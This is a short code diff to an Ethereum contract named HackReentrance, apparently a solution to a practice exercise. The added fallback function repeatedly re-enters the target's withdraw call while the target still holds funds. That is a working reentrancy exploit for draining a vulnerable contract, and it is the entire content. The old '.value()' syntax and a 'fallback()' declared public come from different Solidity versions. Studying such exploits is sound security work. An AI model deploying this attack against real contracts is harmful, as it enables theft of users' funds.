@@ -17,4 +17,10 @@ contract HackReentrance {
   function becomeDonor() public {
     reentranceAddress.donate.value(msg.value)(address(this));
   }
+
+  fallback() public payable {
+    if(address(reentranceAddress).balance != 0){
+      reentranceAddress.withdraw(msg.value);
+    }
+  }
 }
